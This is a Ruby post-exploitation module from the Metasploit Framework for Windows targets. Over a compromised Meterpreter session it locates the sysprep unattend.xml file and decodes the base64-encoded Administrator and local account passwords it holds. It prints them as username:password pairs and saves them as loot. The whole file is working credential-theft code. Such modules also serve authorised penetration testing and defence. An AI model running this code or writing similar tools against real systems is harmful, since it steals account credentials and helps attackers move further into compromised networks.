##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'rex'
require 'msf/core/post/file'
require 'rexml/document'

class Metasploit3 < Msf::Post

	include Msf::Post::File

	def initialize(info={})
		super( update_info( info,
			'Name'          => 'Windows Gather unattend.xml Credentials Extraction',
			'Description'   => %q{
					This module will check the file system for a copy of
				unattend.xml then extract usernames and their corresponding
				passwords. Passwords in unattend.xml are base64 encoded. This
				module extracts and decodes these passwords then stores them
				in loot.
			},
			'License'       => MSF_LICENSE,
			'Author'        => [ 'Sean Verity <veritysr1980[at]gmail.com>' ],
			'Platform'      => [ 'windows' ],
			'SessionTypes'  => [ 'meterpreter' ]
		))
	end

	# Store credentials for local accounts != Administrator
	def store_creds(node_path, node_name)
		enc_pword = node_path.get_text("Password/Value")
		dec_pword = Rex::Text.to_ascii(Rex::Text.decode_base64(enc_pword))
		user_creds = ''
		user_creds << node_path.get_text("Username").to_s << ":" << dec_pword
		print_good(user_creds)

		return user_creds
	end

	def unattend_parser(unattend_file)
		print_status("Parsing unattend.xml...")
		print_status("Credentials will be in <username>:<password> format.\n")

		creds = Array.new

		# Dump the contents of unattend.xml into a variable then convert to an xml object
		unattend_file = session.fs.file.new(unattend_file)
			unattend_var = ''
			until unattend_file.eof?
				unattend_var << unattend_file.read
			end
		unattend_xml = REXML::Document.new unattend_var

		# Extract credentials for the built-in Administrator account
		pword_node = "unattend/settings/component/UserAccounts/AdministratorPassword/Value"
		enc_admin_pword = unattend_xml.elements[pword_node].first
		dec_admin_pword = Rex::Text.to_ascii(Rex::Text.decode_base64(enc_admin_pword))
		admin_creds = ''
		admin_creds << "Administrator:" << dec_admin_pword
		creds << admin_creds
		print_good(admin_creds)

		# Extract credentials for all local accounts in unattend.xml
		# These accounts are likely members of the Administrators group
		lusers_node = "unattend/settings/component/UserAccounts/LocalAccounts/LocalAccount"
		unattend_xml.elements.each(lusers_node) do |luser|
			if luser.get_text("Username")
				creds << store_creds(luser, "Username")
			elsif luser.get_text("Name")
				creds << store_creds(luser, "Name")
			end
		end

		return creds
	end

	def run
		print_status("Determining if unattend.xml is present...")

		# Default location of unattend.xml
		drive = session.fs.file.expand_path("%SystemDrive%")
		path_to_unattend = "\\Windows\\System32\\sysprep\\"
		unattend_file = drive << path_to_unattend << 'unattend.xml'

		if session.fs.file.exists?unattend_file
			loot_path = store_loot(
				'unattend.user.creds',
				'text/csv',
				session,
				unattend_parser(unattend_file),
				'unattend_creds.csv',
				'Credentials found in unattend.xml'
			)
			print_status("Creds stored in " << loot_path)
		else
			print_error(unattend_file << " is not present in the default location.")
		end
	end
end
